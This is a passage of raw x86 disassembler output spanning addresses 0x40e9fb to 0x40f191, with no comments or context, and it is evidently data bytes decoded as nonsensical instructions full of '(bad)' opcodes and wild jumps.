  40e9fb:	scas   al,BYTE PTR es:[edi]
  40e9fc:	adc    eax,esp
  40e9fe:	gs jmp 0x40e9a9
  40ea01:	aam    0x1d
  40ea03:	add    al,0xf5
  40ea05:	or     BYTE PTR [eax],0xbd
  40ea08:	mov    ah,0x82
  40ea0a:	leave  
  40ea0b:	test   eax,0x36c834eb
  40ea10:	aam    0x22
  40ea12:	cs pop esp
  40ea14:	in     eax,0xbb
  40ea16:	fimul  WORD PTR [edi+0x2f]
  40ea19:	(bad)  
  40ea1a:	fcomip st,st(1)
  40ea1c:	cmp    eax,0xe8ad4098
  40ea21:	and    eax,DWORD PTR ds:0xea49a995
  40ea27:	dec    ebp
  40ea28:	dec    edx
  40ea29:	fst    QWORD PTR [edi]
  40ea2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea2c:	call   0xaaebc8bf
  40ea31:	pop    ss
  40ea32:	add    al,0xa4
  40ea34:	sub    bl,ah
  40ea36:	cbw    
  40ea38:	(bad)  
  40ea39:	cli    
  40ea3a:	mov    ebx,0x9a09cbcb
  40ea3f:	mov    edx,ebp
  40ea41:	in     eax,dx
  40ea42:	fsubr  st,st(7)
  40ea44:	add    edx,esi
  40ea46:	(bad)  
  40ea47:	mov    cs,ebx
  40ea49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea4a:	cmp    BYTE PTR [ecx+0x4ca0540],bh
  40ea50:	push   ds
  40ea51:	mov    ss,WORD PTR [esi+0x77]
  40ea54:	or     esi,DWORD PTR [ecx+0x39]
  40ea57:	retf   0x80ef
  40ea5a:	out    0x74,eax
  40ea5c:	and    eax,DWORD PTR [edi]
  40ea5e:	gs mov al,dh
  40ea61:	loope  0x40eaca
  40ea63:	jo     0x40ea0d
  40ea65:	repz call 0xd498:0xf2118d47
  40ea6d:	loopne 0x40ea56
  40ea6f:	mov    dl,0x7c
  40ea71:	clc    
  40ea72:	hlt    
  40ea73:	cmp    al,BYTE PTR [ebx]
  40ea75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea76:	mov    dl,0xe4
  40ea78:	mov    esi,0x803da7c7
  40ea7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea7e:	adc    BYTE PTR [ebx+0x419a240a],cl
  40ea84:	mov    cl,0xac
  40ea86:	frstor [ebp-0xe]
  40ea89:	adc    esi,ebp
  40ea8b:	jp     0x40ea46
  40ea8d:	jae    0x40ea9d
  40ea8f:	jge    0x40eae1
  40ea91:	sub    al,al
  40ea93:	aaa    
  40ea94:	xchg   ecx,eax
  40ea95:	mov    WORD PTR [ecx+0x644182f5],?
  40ea9b:	cmp    ch,BYTE PTR [ecx]
  40ea9d:	cmp    BYTE PTR [edx+edi*1],cl
  40eaa0:	fsub   DWORD PTR [bx+si+0x19]
  40eaa4:	cs in  al,dx
  40eaa6:	sbb    ah,BYTE PTR [eax+0x46873ab2]
  40eaac:	aas    
  40eaad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eaae:	pusha  
  40eaaf:	dec    eax
  40eab0:	push   esp
  40eab1:	xor    al,0x89
  40eab3:	call   0xe52c:0x7ffd8d6c
  40eaba:	and    DWORD PTR es:[edi+0x38],eax
  40eabe:	fdiv   QWORD PTR [ecx]
  40eac0:	rol    DWORD PTR [ebx+ecx*1+0x160eeeed],cl
  40eac7:	mov    dh,0xdf
  40eac9:	(bad)  [esp+eiz*8+0x187a7151]
  40ead0:	int    0xf0
  40ead2:	xor    DWORD PTR [ebx],edi
  40ead4:	dec    edi
  40ead5:	adc    bh,ah
  40ead7:	fistp  DWORD PTR ds:0xdb33e1a9
  40eadd:	icebp  
  40eade:	mov    esi,0xcafcff15
  40eae3:	xlat   BYTE PTR ds:[ebx]
  40eae4:	icebp  
  40eae5:	call   0xc1ef2cf4
  40eaea:	inc    eax
  40eaeb:	sub    al,0x80
  40eaed:	in     al,dx
  40eaee:	lock push edi
  40eaf0:	icebp  
  40eaf1:	imul   edi,ebx,0x7b518617
  40eaf7:	test   DWORD PTR ds:0x97f7e686,esi
  40eafd:	mov    al,ds:0x742e4eee
  40eb02:	call   0x2b92:0x926a7eb5
  40eb09:	cmp    edi,DWORD PTR [esp+esi*1+0x51]
  40eb0d:	test   DWORD PTR [eax+ebx*4],0x5a515072
  40eb14:	popf   
  40eb15:	int3   
  40eb16:	jae    0x40eb81
  40eb18:	fst    DWORD PTR [ebx]
  40eb1a:	push   esi
  40eb1b:	mov    ds:0xe2f76966,eax
  40eb20:	pop    ss
  40eb21:	pop    ss
  40eb22:	shr    BYTE PTR [edi],cl
  40eb24:	in     al,dx
  40eb25:	je     0x40eb07
  40eb27:	mov    esi,0x90fbcfbd
  40eb2c:	jl     0x40eb04
  40eb2e:	popf   
  40eb2f:	lds    edx,FWORD PTR [eax]
  40eb31:	pop    eax
  40eb32:	jbe    0x40eac9
  40eb34:	mov    al,ds:0x56821f6c
  40eb39:	loope  0x40eb3a
  40eb3b:	inc    edi
  40eb3c:	nop
  40eb3d:	jle    0x40eba4
  40eb3f:	jp     0x40eb49
  40eb41:	jmp    0x2fc4:0x7bad5e8d
  40eb48:	rcl    DWORD PTR [eax+0x1b],1
  40eb4b:	sbb    BYTE PTR [ebx+0x22396375],bh
  40eb51:	enter  0xd639,0x7b
  40eb55:	sub    BYTE PTR [ebp+0x51a7e590],al
  40eb5b:	jbe    0x40ebd6
  40eb5d:	rcr    DWORD PTR [esi-0x17a6e7fb],0x7e
  40eb64:	sub    ah,BYTE PTR [ecx+0x5078a849]
  40eb6a:	mov    cl,0x26
  40eb6c:	sub    BYTE PTR [esi],dh
  40eb6e:	ret    0xf55b
  40eb71:	push   ebx
  40eb72:	mov    ds:0x83f932b1,eax
  40eb77:	inc    edi
  40eb78:	ins    DWORD PTR es:[edi],dx
  40eb79:	pushf  
  40eb7a:	push   0x59d959c2
  40eb7f:	pop    esp
  40eb80:	mov    ecx,0x7643b106
  40eb85:	and    eax,0x4eaf2321
  40eb8a:	out    dx,al
  40eb8b:	cld    
  40eb8c:	jmp    0xa7a2b17c
  40eb91:	loop   0x40eb6f
  40eb93:	mov    esi,0x4cc5f77a
  40eb98:	mov    ecx,0xe8821308
  40eb9d:	jbe    0x40ec0e
  40eb9f:	loopne 0x40eb44
  40eba1:	ins    BYTE PTR es:[edi],dx
  40eba2:	std    
  40eba3:	aaa    
  40eba4:	and    BYTE PTR [eax],cl
  40eba6:	ss jnp 0x40eb32
  40eba9:	arpl   WORD PTR [ecx*8+0x140ebc04],dx
  40ebb0:	mov    eax,ds:0x5c785292
  40ebb5:	mov    cl,0xb1
  40ebb7:	adc    eax,0x22e000f3
  40ebbc:	leave  
  40ebbd:	or     BYTE PTR [eax+ebx*2],0xac
  40ebc1:	ficom  WORD PTR [edi]
  40ebc3:	jno    0x40ebba
  40ebc5:	jl     0x40ebb5
  40ebc7:	xchg   ebp,eax
  40ebc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ebc9:	inc    ebx
  40ebca:	test   DWORD PTR [ecx+0x4c1d9c1f],esi
  40ebd0:	and    DWORD PTR ds:0xf7c1eca9,edx
  40ebd6:	call   0x5cf9444
  40ebdb:	adc    al,0xa3
  40ebdd:	hlt    
  40ebde:	jns    0x40ebfd
  40ebe0:	ficom  DWORD PTR [edi]
  40ebe2:	or     bh,ch
  40ebe4:	sbb    esp,DWORD PTR [edi]
  40ebe6:	or     eax,0xff0ff331
  40ebeb:	jno    0x40ebca
  40ebed:	xlat   BYTE PTR ds:[ebx]
  40ebee:	fsubr  QWORD PTR [edx-0x4bd8b5f5]
  40ebf4:	push   ss
  40ebf5:	out    0x23,al
  40ebf7:	push   es
  40ebf8:	dec    esp
  40ebf9:	fs pushf 
  40ebfb:	cmp    al,0x2f
  40ebfd:	in     al,dx
  40ebfe:	out    dx,eax
  40ebff:	sbb    ecx,DWORD PTR [edx-0x1e]
  40ec02:	stos   DWORD PTR es:[edi],eax
  40ec03:	sub    BYTE PTR [ebx+0x60],0xc6
  40ec07:	retf   0x4af1
  40ec0a:	aaa    
  40ec0b:	jmp    0x2f20b31c
  40ec10:	cmp    eax,0x191d5b87
  40ec15:	add    eax,0xb34bf64e
  40ec1a:	xor    ecx,DWORD PTR [eax+edi*8-0x7]
  40ec1e:	xchg   edx,eax
  40ec1f:	sub    al,0x85
  40ec21:	aad    0x67
  40ec23:	dec    ebx
  40ec24:	jno    0x40ec35
  40ec26:	inc    ebx
  40ec27:	mov    ebx,0x4bcd5b2d
  40ec2c:	xchg   ebx,eax
  40ec2d:	(bad)  
  40ec2e:	mov    edx,0xc3ba7a04
  40ec33:	mul    DWORD PTR [ecx+0x4f]
  40ec36:	fcomp  DWORD PTR [edi-0x4f5e69f3]
  40ec3c:	scas   al,BYTE PTR es:[edi]
  40ec3d:	xor    al,0xe3
  40ec3f:	inc    eax
  40ec40:	stc    
  40ec41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec42:	test   DWORD PTR [eax-0x50],eax
  40ec45:	mov    eax,ds:0x5033d4a1
  40ec4a:	test   eax,0x9a3269c7
  40ec4f:	xlat   BYTE PTR ds:[ebx]
  40ec50:	cmp    al,BYTE PTR [esi-0x7]
  40ec53:	mov    BYTE PTR [edx-0x3fd5d359],dl
  40ec59:	sti    
  40ec5a:	dec    esi
  40ec5b:	jmp    0x845d:0x3be483f5
  40ec62:	mov    esi,0xc9fa6bd6
  40ec67:	loopne 0x40ec61
  40ec69:	dec    edi
  40ec6a:	inc    eax
  40ec6b:	mov    esi,0x7f61ac8c
  40ec70:	pop    edi
  40ec71:	cmc    
  40ec72:	popf   
  40ec73:	mov    eax,ds:0x4470063a
  40ec78:	pop    eax
  40ec79:	ret    
  40ec7a:	sub    BYTE PTR [esi-0x5cabfe6b],bh
  40ec80:	and    esi,DWORD PTR [ebx+0x36]
  40ec83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec84:	rcl    DWORD PTR [edx+0x2e],1
  40ec87:	ficomp WORD PTR [esi+0x19]
  40ec8a:	adc    DWORD PTR [ebx],0x99592442
  40ec90:	push   ds
  40ec91:	push   0xffffffa6
  40ec93:	fsubr  st,st(4)
  40ec95:	xor    esp,esi
  40ec97:	ins    DWORD PTR es:[edi],dx
  40ec98:	nop
  40ec99:	fs push edi
  40ec9b:	test   DWORD PTR [esi+0x35],ecx
  40ec9e:	inc    eax
  40ec9f:	ds push edi
  40eca1:	scas   al,BYTE PTR es:[edi]
  40eca2:	lahf   
  40eca3:	push   edi
  40eca4:	push   edi
  40eca5:	(bad)  
  40eca6:	push   esi
  40eca7:	scas   al,BYTE PTR es:[edi]
  40eca8:	mov    WORD PTR [ebx],ds
  40ecaa:	xchg   edx,eax
  40ecab:	(bad)  
  40ecac:	in     al,0xb7
  40ecae:	mov    dl,0xfb
  40ecb0:	test   eax,0xe9b88ee8
  40ecb5:	int    0xd8
  40ecb7:	loopne 0x40eceb
  40ecb9:	cmc    
  40ecba:	jns    0x40ecab
  40ecbc:	loope  0x40ec52
  40ecbe:	or     edx,ebx
  40ecc0:	retf   0xd8b3
  40ecc3:	test   eax,0xeb3efb71
  40ecc8:	daa    
  40ecc9:	ins    DWORD PTR es:[edi],dx
  40ecca:	call   0xa504:0x4cce2cec
  40ecd1:	sub    al,0xe7
  40ecd3:	(bad)  
  40ecd4:	(bad)  
  40ecd5:	ret    
  40ecd6:	lock jecxz 0x40ece2
  40ecd9:	mov    al,ds:0x87b756d8
  40ecde:	pop    edi
  40ecdf:	jg     0x40ec6b
  40ece1:	or     eax,esi
  40ece3:	cmp    edi,DWORD PTR [edx]
  40ece5:	gs and al,0x5
  40ece8:	add    DWORD PTR [esi+0x55],ebp
  40eceb:	xor    esi,ebp
  40eced:	push   ebx
  40ecee:	imul   edi,DWORD PTR [ecx+ebx*8+0xe],0x8e8fa7e3
  40ecf6:	test   DWORD PTR [eax+0xf9ff546],eax
  40ecfc:	ret    0xc324
  40ecff:	in     eax,0xe6
  40ed01:	dec    edi
  40ed02:	adc    eax,0x80da0a03
  40ed07:	out    dx,eax
  40ed08:	xor    bl,BYTE PTR [ecx+0x735de5df]
  40ed0e:	cmp    eax,0xde39c43e
  40ed13:	inc    ebx
  40ed14:	xchg   edx,eax
  40ed15:	nop
  40ed16:	sbb    dl,BYTE PTR [ebx]
  40ed18:	pushf  
  40ed19:	(bad)  
  40ed1b:	ins    BYTE PTR es:[edi],dx
  40ed1c:	in     eax,0x46
  40ed1e:	test   al,ah
  40ed20:	xlat   BYTE PTR ds:[ebx]
  40ed21:	into   
  40ed22:	cli    
  40ed23:	fwait
  40ed24:	push   ebp
  40ed25:	pop    esp
  40ed26:	(bad)  
  40ed27:	mov    dl,0x6d
  40ed29:	sub    eax,0xba299ae5
  40ed2e:	pushf  
  40ed2f:	ja     0x40ed32
  40ed31:	rcr    DWORD PTR [esi],1
  40ed33:	(bad)  
  40ed34:	lods   al,BYTE PTR ds:[esi]
  40ed35:	mov    ebp,0x64385e2b
  40ed3a:	pop    esp
  40ed3b:	out    0x67,eax
  40ed3d:	ror    DWORD PTR [eax+0x72fa1eef],cl
  40ed43:	sbb    DWORD PTR [ecx],edi
  40ed45:	in     al,dx
  40ed46:	out    0xbc,eax
  40ed48:	pop    ecx
  40ed49:	sub    ecx,DWORD PTR [eax-0x37f1cb60]
  40ed4f:	je     0x40edbf
  40ed51:	cmc    
  40ed52:	in     eax,dx
  40ed53:	pop    edx
  40ed54:	popf   
  40ed55:	ins    DWORD PTR es:[edi],dx
  40ed56:	push   ds
  40ed57:	fdiv   QWORD PTR ds:0x9ae57680
  40ed5d:	js     0x40edb8
  40ed5f:	cmp    al,0xde
  40ed61:	arpl   WORD PTR [edx+0x3],dx
  40ed64:	jne    0x40ed1e
  40ed66:	mov    ecx,0xefbc0e9c
  40ed6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed6c:	dec    edx
  40ed6d:	add    edi,ebp
  40ed6f:	jge    0x40edc4
  40ed71:	xchg   esp,eax
  40ed72:	and    al,0x3e
  40ed74:	adc    DWORD PTR [ebp+0xa],ebx
  40ed77:	dec    eax
  40ed78:	push   0x1f
  40ed7a:	ret    0x394
  40ed7d:	(bad)  
  40ed7e:	int3   
  40ed7f:	nop
  40ed80:	adc    al,0x2b
  40ed82:	imul   edi,DWORD PTR [edx-0x2f],0x79436831
  40ed89:	jmp    0x238e732b
  40ed8e:	cld    
  40ed8f:	and    al,0xd6
  40ed91:	jb     0x40ede8
  40ed93:	push   es
  40ed94:	loop   0x40edd3
  40ed96:	xchg   ecx,eax
  40ed97:	push   0x16fd09f5
  40ed9c:	mov    ecx,0xcb8c0ed2
  40eda1:	jecxz  0x40ed4d
  40eda3:	xor    al,BYTE PTR [edi+0x6e]
  40eda6:	pop    ebx
  40eda7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eda8:	rcr    DWORD PTR [ecx],0x4e
  40edab:	fsubr  QWORD PTR [edx+ebp*4-0x6c]
  40edaf:	add    bh,BYTE PTR [eax-0x667f852f]
  40edb5:	call   0xea264123
  40edba:	sbb    eax,0xce835e5c
  40edbf:	pop    ds
  40edc0:	push   cs
  40edc1:	rol    cl,1
  40edc3:	xor    eax,0x34a2a8af
  40edc8:	and    eax,0xc1153a06
  40edcd:	dec    ebp
  40edce:	mul    DWORD PTR [ebp+0x6ce8c1ea]
  40edd4:	(bad)  
  40edd5:	stc    
  40edd6:	jb     0x40edba
  40edd8:	cwde   
  40edd9:	fs inc edi
  40eddb:	aas    
  40eddc:	fistp  DWORD PTR [ecx-0x74]
  40eddf:	xchg   ebp,eax
  40ede0:	lahf   
  40ede1:	lock scas eax,DWORD PTR es:[edi]
  40ede3:	aaa    
  40ede4:	lea    ecx,[edi-0x1a]
  40ede7:	in     al,dx
  40ede8:	(bad)  
  40ede9:	retf   
  40edea:	test   eax,0xb0686449
  40edef:	pop    eax
  40edf0:	xor    ebx,DWORD PTR [edx+ebp*2-0x21c393e2]
  40edf7:	and    eax,0x23fb7f46
  40edfc:	je     0x40ee79
  40edfe:	data16 shr BYTE PTR [esi+0x27],cl
  40ee02:	xor    BYTE PTR [edi-0x720e0dac],dl
  40ee08:	cmp    eax,0x9beb0ecb
  40ee0d:	push   ebx
  40ee0e:	or     esp,DWORD PTR [edx-0x6fbd4f26]
  40ee14:	xor    eax,0x886d5e90
  40ee19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee1a:	or     al,0x52
  40ee1c:	in     eax,0x1d
  40ee1e:	dec    esi
  40ee1f:	pop    ds
  40ee20:	xchg   esi,eax
  40ee21:	inc    eax
  40ee22:	aad    0xdd
  40ee24:	stos   BYTE PTR es:[edi],al
  40ee25:	fdiv   QWORD PTR [ecx]
  40ee27:	jae    0x40ee15
  40ee29:	cmp    eax,0xa3c00776
  40ee2e:	aaa    
  40ee2f:	imul   edi,ebp,0x18e4e97e
  40ee35:	sar    BYTE PTR [ebp-0x6],1
  40ee38:	outs   dx,DWORD PTR ds:[esi]
  40ee39:	nop
  40ee3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ee3b:	sar    BYTE PTR [ebx-0xb28aa26],cl
  40ee41:	fsub   DWORD PTR [edi-0x36a6de04]
  40ee47:	mov    BYTE PTR [ecx+0x39],ch
  40ee4a:	int3   
  40ee4b:	push   edi
  40ee4c:	mov    esp,0x99ba1abb
  40ee51:	pop    esp
  40ee52:	xchg   ecx,eax
  40ee53:	leave  
  40ee54:	lods   eax,DWORD PTR ds:[esi]
  40ee55:	mov    dh,0xe9
  40ee57:	stos   DWORD PTR es:[edi],eax
  40ee58:	not    BYTE PTR ds:0x22cca6ba
  40ee5e:	idiv   esi
  40ee60:	cmc    
  40ee61:	adc    cl,BYTE PTR ds:0xbaf04ffa
  40ee67:	add    al,0x62
  40ee69:	ret    
  40ee6a:	psraw  mm2,QWORD PTR [eax+ebx*1-0x1d]
  40ee6f:	rcl    DWORD PTR [eax-0x53],cl
  40ee72:	aam    0x71
  40ee74:	dec    ebx
  40ee75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee76:	jae    0x40eeb1
  40ee78:	adc    bh,cl
  40ee7a:	add    ebx,ebx
  40ee7c:	aad    0x67
  40ee7e:	(bad)  
  40ee7f:	into   
  40ee80:	inc    ebp
  40ee81:	mov    cl,0xfd
  40ee83:	rcr    al,cl
  40ee85:	or     DWORD PTR [ebp-0x7c],0xffffffe9
  40ee89:	inc    ebx
  40ee8a:	and    edi,DWORD PTR [edx+edx*1-0x48a39eeb]
  40ee91:	jl     0x40ee98
  40ee93:	inc    ebp
  40ee94:	out    dx,eax
  40ee95:	xlat   BYTE PTR ds:[ebx]
  40ee96:	dec    esi
  40ee97:	imul   eax,DWORD PTR [ebp+0x56],0xffffffcf
  40ee9b:	pop    ds
  40ee9c:	fcomp  DWORD PTR [ebp-0x161aeb8]
  40eea2:	mov    dl,0xc2
  40eea4:	adc    al,0x1
  40eea6:	repz push esi
  40eea8:	add    bl,BYTE PTR [edx+0x25004273]
  40eeae:	call   0xf4f1:0x4250859c
  40eeb5:	pop    esi
  40eeb6:	xor    bh,0x9f
  40eeb9:	retf   0xfac0
  40eebc:	mov    esi,0xbe930ab2
  40eec1:	mov    edx,0x179d579c
  40eec6:	loopne 0x40ee93
  40eec8:	push   ebx
  40eec9:	mov    ecx,0x54dd6533
  40eece:	add    al,0x93
  40eed0:	int    0xa
  40eed2:	loope  0x40ef21
  40eed4:	cmp    BYTE PTR [ecx+0x3d223313],ah
  40eeda:	jg     0x40ee61
  40eedc:	dec    edi
  40eedd:	dec    edi
  40eede:	cli    
  40eedf:	jae    0x40eecc
  40eee1:	mov    edi,0x291d2142
  40eee6:	jle    0x40ef2a
  40eee8:	jae    0x40eecb
  40eeea:	jo     0x40ee7e
  40eeec:	push   edi
  40eeed:	addr16 mov bl,0x55
  40eef0:	xor    DWORD PTR [eax+eax*4],0x956929ca
  40eef7:	push   es
  40eef8:	inc    edi
  40eef9:	mov    gs,ebx
  40eefb:	mov    ds:0x56937767,eax
  40ef00:	mov    edi,0x7a803cab
  40ef05:	aas    
  40ef06:	rcl    BYTE PTR [edi],cl
  40ef08:	adc    DWORD PTR [esi-0x1b],ebx
  40ef0b:	adc    BYTE PTR [eax+0x2a],bl
  40ef0e:	scas   al,BYTE PTR es:[edi]
  40ef0f:	mov    ds:0x910c3090,al
  40ef14:	icebp  
  40ef15:	sub    ecx,ecx
  40ef17:	in     eax,dx
  40ef18:	cwde   
  40ef19:	inc    eax
  40ef1a:	mov    ds:0x6a5cf84e,al
  40ef1f:	xchg   edx,eax
  40ef20:	mov    ch,BYTE PTR ds:0x1f1808f8
  40ef26:	mov    edi,0xa0dcdf69
  40ef2b:	iret   
  40ef2c:	call   DWORD PTR [esi+0x2fdda492]
  40ef32:	sbb    eax,0xa3ea08ad
  40ef37:	test   DWORD PTR [edi+0x6f],ebx
  40ef3a:	idiv   DWORD PTR [ebp-0x3ba0922f]
  40ef40:	out    0x3d,eax
  40ef42:	xor    eax,eax
  40ef44:	and    eax,0x3b04d0e9
  40ef49:	and    eax,0x32ae7f0b
  40ef4e:	cld    
  40ef4f:	mov    eax,ds:0x18eb3898
  40ef54:	jae    0x40efb4
  40ef56:	or     ah,BYTE PTR [ebx+eax*8+0x2ac521e7]
  40ef5d:	ins    BYTE PTR es:[edi],dx
  40ef5e:	xchg   esp,eax
  40ef5f:	lods   al,BYTE PTR ds:[esi]
  40ef60:	jmp    0x1748ddf2
  40ef65:	into   
  40ef66:	jg     0x40ef58
  40ef68:	into   
  40ef69:	xchg   BYTE PTR [ecx-0x7b],bh
  40ef6c:	xor    bl,BYTE PTR [ecx]
  40ef6e:	int    0xa7
  40ef70:	mov    al,0x9a
  40ef72:	dec    ebp
  40ef73:	je     0x40ef0e
  40ef75:	adc    BYTE PTR [edi],ah
  40ef77:	xchg   ebp,eax
  40ef78:	imul   ebp,DWORD PTR [edi+0x2e],0x5be08de5
  40ef7f:	shr    DWORD PTR [edi],cl
  40ef81:	stc    
  40ef82:	lds    ecx,FWORD PTR ds:0x4e1ab49d
  40ef88:	hlt    
  40ef89:	mov    DWORD PTR [edx],esi
  40ef8b:	out    0x45,al
  40ef8d:	adc    dh,dl
  40ef8f:	mov    ds:0xb6295a2d,eax
  40ef94:	mov    ds:0x5c1da976,eax
  40ef99:	lds    esp,FWORD PTR [esp+edx*8]
  40ef9c:	dec    BYTE PTR [edi-0x677416d0]
  40efa2:	cs xor ebx,esp
  40efa5:	paddb  mm7,QWORD PTR [ebx+0x13]
  40efa9:	fwait
  40efaa:	addr16 into 
  40efac:	pop    edx
  40efad:	test   DWORD PTR [edx-0x1c],0xa1fc88bb
  40efb4:	adc    BYTE PTR [ebp+0x3d],dh
  40efb7:	mov    eax,0x1b44e875
  40efbc:	pop    ss
  40efbd:	dec    esp
  40efbe:	rcr    DWORD PTR [edx-0x684f07db],1
  40efc4:	gs mov edi,0x45cc1b6e
  40efca:	or     ebp,DWORD PTR [eax]
  40efcc:	test   esp,ebp
  40efce:	push   ds
  40efcf:	scas   al,BYTE PTR es:[edi]
  40efd0:	cmp    bh,bh
  40efd2:	mov    cs,edi
  40efd4:	lods   al,BYTE PTR ds:[esi]
  40efd5:	pop    ecx
  40efd6:	jge    0x40f017
  40efd8:	and    ah,BYTE PTR [edi]
  40efda:	add    al,0xdc
  40efdc:	add    eax,0x575fddc0
  40efe1:	imul   esp,DWORD PTR [edx+0x2d],0x9fb771a0
  40efe8:	repnz imul ah
  40efeb:	sub    ebp,esp
  40efed:	pop    esp
  40efef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eff0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eff1:	daa    
  40eff2:	jno    0x40f04b
  40eff4:	jb     0x40efc0
  40eff6:	pop    ebp
  40eff7:	outs   dx,BYTE PTR ds:[esi]
  40eff8:	repnz div esp
  40effb:	lgs    esi,FWORD PTR [eax]
  40effe:	pop    eax
  40efff:	or     ah,BYTE PTR [eax+0xa]
  40f002:	jbe    0x40f058
  40f004:	rcr    dl,1
  40f006:	mov    eax,0x85fdc2b
  40f00b:	call   0xbc16284d
  40f010:	cli    
  40f011:	dec    ecx
  40f012:	xor    al,0x3d
  40f014:	(bad)  [ebp-0x402cfdf3]
  40f01a:	mov    esp,0x25968792
  40f020:	mov    al,0x57
  40f022:	shl    DWORD PTR [edi+eax*4+0x12],cl
  40f026:	inc    esp
  40f027:	ja     0x40f01e
  40f029:	sti    
  40f02a:	in     eax,dx
  40f02b:	adc    ah,BYTE PTR [edx-0x7e687f82]
  40f031:	test   eax,0x50c14d48
  40f036:	or     BYTE PTR [ebp+0x21],0xab
  40f03a:	jle    0x40f08a
  40f03c:	mov    esp,eax
  40f03e:	mov    ds:0xf3a24d44,al
  40f043:	out    dx,al
  40f044:	pop    esi
  40f045:	loope  0x40f038
  40f047:	pop    eax
  40f048:	rcl    BYTE PTR [edx+esi*8-0x27],0x48
  40f04d:	xchg   ebp,eax
  40f04e:	ss cdq 
  40f050:	fist   WORD PTR [edx]
  40f052:	shl    DWORD PTR [eax+0x212a091],0x4a
  40f059:	push   edi
  40f05a:	xor    BYTE PTR [ebp-0x57432173],cl
  40f060:	outs   dx,DWORD PTR ds:[esi]
  40f061:	and    eax,0xccb54671
  40f066:	std    
  40f067:	out    0xb0,al
  40f069:	xor    al,0x51
  40f06b:	xchg   ebx,eax
  40f06c:	mov    eax,ds:0xf8d7b85a
  40f071:	mov    ds:0xcf1d946d,eax
  40f076:	pop    esi
  40f077:	or     eax,0x132f8098
  40f07c:	shr    esp,cl
  40f07e:	dec    esp
  40f07f:	inc    eax
  40f080:	push   ecx
  40f081:	mov    eax,ds:0x16489636
  40f086:	dec    ebx
  40f087:	jnp    0x40f024
  40f089:	fcom   DWORD PTR [eax+0xb2ab5d8]
  40f08f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f090:	dec    esp
  40f091:	das    
  40f092:	xor    al,0xe0
  40f094:	mov    cl,0x70
  40f096:	or     edi,DWORD PTR [edx]
  40f098:	pusha  
  40f099:	scas   eax,DWORD PTR es:[edi]
  40f09a:	jnp    0x40f063
  40f09c:	add    cl,dl
  40f09e:	repz clc 
  40f0a0:	repnz mov ds:0xe91c99f8,al
  40f0a6:	inc    esi
  40f0a7:	xor    eax,0x5ea2f718
  40f0ac:	xor    eax,0xbf5dc16f
  40f0b1:	and    al,0x9c
  40f0b3:	mov    esi,0x4c2c91fa
  40f0b8:	pop    ebx
  40f0b9:	jle    0x40f101
  40f0bb:	and    dl,bh
  40f0bd:	out    dx,al
  40f0be:	fs sbb eax,0x8a565002
  40f0c4:	mov    DWORD PTR [ebx-0x41],ebx
  40f0c7:	cld    
  40f0c8:	data16 cmp al,0x9c
  40f0cb:	neg    BYTE PTR [edi+0x25]
  40f0ce:	mov    ebx,0x2a5d2cd0
  40f0d3:	jmp    0x5537:0xcb369b2b
  40f0da:	test   dh,bl
  40f0dc:	xchg   DWORD PTR [ecx+0x7d4875d8],edi
  40f0e2:	jge    0x40f0f7
  40f0e4:	cmp    edi,DWORD PTR [esi-0x7a9dff8d]
  40f0ea:	icebp  
  40f0eb:	adc    cl,BYTE PTR [ecx+0x3783df05]
  40f0f1:	hlt    
  40f0f2:	je     0x40f137
  40f0f4:	shl    ah,1
  40f0f6:	add    DWORD PTR [ebx-0x31],ebp
  40f0f9:	ss arpl bx,si
  40f0fc:	or     edx,edx
  40f0fe:	mov    bl,bh
  40f100:	push   es
  40f101:	not    esp
  40f103:	mov    cl,0x4c
  40f105:	std    
  40f106:	push   ebx
  40f107:	into   
  40f108:	retf   
  40f109:	or     BYTE PTR [eax+0x73],al
  40f10c:	pop    esi
  40f10d:	pop    es
  40f10e:	dec    ecx
  40f10f:	cmp    al,0x3b
  40f111:	ds push 0x257a5420
  40f117:	pop    es
  40f118:	leave  
  40f119:	mov    ds:0x9f66e903,eax
  40f11e:	sahf   
  40f11f:	add    ah,BYTE PTR ds:0xa972432
  40f125:	add    bl,BYTE PTR [eax+0x3e27d326]
  40f12b:	jmp    FWORD PTR [esi+0x7c66bf08]
  40f131:	xor    ebp,DWORD PTR [edi]
  40f133:	pop    edi
  40f134:	adc    cl,BYTE PTR [ecx+0x6f4dbda2]
  40f13a:	dec    eax
  40f13b:	xor    bl,BYTE PTR [edi-0x5adc0291]
  40f141:	or     esi,esi
  40f143:	inc    ebp
  40f144:	dec    edx
  40f145:	add    ch,BYTE PTR ds:0x2a7cbf34
  40f14b:	(bad)  
  40f14c:	add    eax,0xbc63c42c
  40f151:	mov    dh,0xcd
  40f153:	cmp    ebp,DWORD PTR [edi]
  40f155:	mov    BYTE PTR [eax-0x1a],ah
  40f158:	fwait
  40f159:	mov    BYTE PTR [ebx],ch
  40f15b:	addr16 push 0xffffffa1
  40f15e:	adc    dl,0xf6
  40f161:	fidiv  WORD PTR [eax+0x62]
  40f164:	popa   
  40f165:	inc    ebx
  40f166:	mov    esp,0xcaf04a6f
  40f16b:	push   ebp
  40f16c:	mov    DWORD PTR [esi-0x75],edx
  40f16f:	in     eax,0x83
  40f171:	out    dx,eax
  40f172:	mov    dl,BYTE PTR [edi+ecx*2]
  40f175:	push   ebp
  40f176:	xchg   edx,eax
  40f177:	jne    0x40f145
  40f179:	jmp    0xcae67e33
  40f17e:	push   ebx
  40f17f:	test   DWORD PTR [eax-0x54],0x448f3535
  40f186:	test   al,0x14
  40f188:	jmp    0xe3afb44a
  40f18d:	dec    ecx
  40f18e:	(bad)  
  40f18f:	fadd   st(1),st
  40f191:	xchg   ebx,eax
